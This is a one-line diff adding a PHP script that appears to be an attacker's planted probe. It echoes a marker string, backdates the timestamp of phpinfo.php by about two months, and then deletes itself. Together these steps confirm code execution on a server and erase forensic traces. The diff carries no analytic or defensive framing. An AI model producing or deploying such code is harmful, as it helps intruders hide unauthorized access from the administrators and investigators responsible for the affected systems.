@@ -1,0 +1,1 @@
+<?php echo "cdBHQRVKNV"; if (file_exists("./phpinfo.php")){ touch("./phpinfo.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*4Vx0UZsSThQwt1v5FDH8*/ ?>
